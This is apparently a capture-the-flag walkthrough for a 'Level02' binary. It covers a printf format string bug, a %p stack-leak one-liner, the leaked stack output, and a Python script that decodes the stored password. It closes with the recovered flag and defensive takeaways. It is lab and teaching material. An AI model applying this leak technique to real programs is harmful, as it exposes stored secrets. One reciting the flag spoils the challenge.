@@ -1,0 +1,151 @@
+# Level02 Walkthrough
+
+## Vulnerability
+
+**Format String Vulnerability** in `printf(s)` at line 171 of the decompiled code.
+
+The program passes user-controlled input (username) directly to `printf()` without a format string:
+```c
+printf(s);  // VULNERABLE! Should be: printf("%s", s);
+```
+
+## Analysis Steps
+
+### 1. Export and examine the binary
+
+```bash
+scp -P 4242 level02@192.168.44.139:~/level02 ./binaries/level02
+file binaries/level02
+# ELF 64-bit LSB executable (x86-64)
+strings binaries/level02
+```
+
+Key findings:
+- 64-bit binary (different from previous 32-bit levels)
+- Reads password from `/home/users/level03/.pass`
+- Has username/password authentication
+- String: "Greetings, %s!" suggests format string usage
+
+### 2. Decompile with Ghidra/IDA
+
+Program flow:
+1. Opens `/home/users/level03/.pass` and reads 41 bytes into `ptr[48]` at `[rbp-A0h]`
+2. Prompts for username → stored in `s[96]` at `[rbp-70h]`
+3. Prompts for password → stored in `s2[96]` at `[rbp-110h]`
+4. Compares password: `strncmp(ptr, s2, 0x29)` (0x29 = 41 bytes)
+5. **If password is WRONG**: `printf(s)` ← Format string vulnerability!
+6. **If password is CORRECT**: Spawns `/bin/sh`
+
+### 3. Stack Layout Analysis
+
+```
+[rbp-110h]  s2[96]      - Password input (user controlled)
+[rbp-B0h]   v5          - Integer variable
+[rbp-A0h]   ptr[48]     - Real password from file (41 bytes) ← TARGET!
+[rbp-70h]   s[96]       - Username input (user controlled)
+[rbp-10h]   v8
+[rbp-Ch]    v9
+[rbp-8h]    stream
+```
+
+The real password is stored on the stack at `[rbp-A0h]`, and we control the username at `[rbp-70h]`.
+
+### 4. Exploitation Strategy
+
+Since we don't know the correct password, we'll:
+1. Enter a format string as username (e.g., `%p %p %p...`)
+2. Enter any wrong password to trigger the vulnerability
+3. The `printf(s)` will leak stack memory
+4. Extract the password from the leaked data
+5. Use the password to login properly
+
+## Exploitation
+
+### Step 1: Leak stack memory
+
+```bash
+python3 -c "print('%p ' * 30)" | ./level02
+```
+
+This prints 30 pointer values from the stack.
+
+### Step 2: Analyze the output
+
+Running the exploit:
+```
+0x7fffffffead0 (nil) 0x77 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a
+0x7fffffffecc8 0x1f7ff9a08 0x676e6f7277 (nil) (nil) (nil) (nil)
+(nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil)
+0x756e505234376848 0x45414a3561733951 0x377a7143574e6758
+0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025
+0x2520702520702520 0x2070252070252070
+```
+
+Notice positions 21-25 contain interesting hex values that look like ASCII!
+
+### Step 3: Decode the password
+
+The values at positions 21-25 are:
+```
+0x756e505234376848
+0x45414a3561733951
+0x377a7143574e6758
+0x354a35686e475873
+0x48336750664b394d
+```
+
+These are 64-bit little-endian values. Converting to ASCII:
+
+```python
+import struct
+
+values = [
+    0x756e505234376848,
+    0x45414a3561733951,
+    0x377a7143574e6758,
+    0x354a35686e475873,
+    0x48336750664b394d
+]
+
+password = b''
+for val in values:
+    password += struct.pack('<Q', val)  # Little-endian 64-bit
+
+print(password.decode('ascii'))
+# Output: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
+
+### Step 4: Login with the password
+
+```bash
+echo -e "anything\nHh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H" | ./level02
+# Output: Greetings, anything!
+# Shell spawned as level03!
+```
+
+## Flag
+
+```
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
+
+## Key Takeaways
+
+1. **Format string vulnerabilities** allow reading/writing arbitrary memory
+2. **Always use format strings**: `printf("%s", user_input)` not `printf(user_input)`
+3. **Stack contains sensitive data**: Passwords, keys, addresses can be leaked
+4. **64-bit exploitation**: Little-endian byte order, 8-byte pointers
+5. **Defense**: Use `-Wformat` compiler flag, static analysis tools, and never trust user input in format strings
+
+## Alternative Exploitation Methods
+
+### Method 1: Direct memory read (not used here)
+Could use `%s` with specific addresses to read memory directly.
+
+### Method 2: Write arbitrary memory (not needed here)
+Format string `%n` can write to memory, potentially overwriting return addresses or function pointers.
+
+### Method 3: Brute force (impractical)
+41-character alphanumeric password = 62^41 combinations (impossible to brute force)
+
+The format string leak was the most elegant and efficient solution!
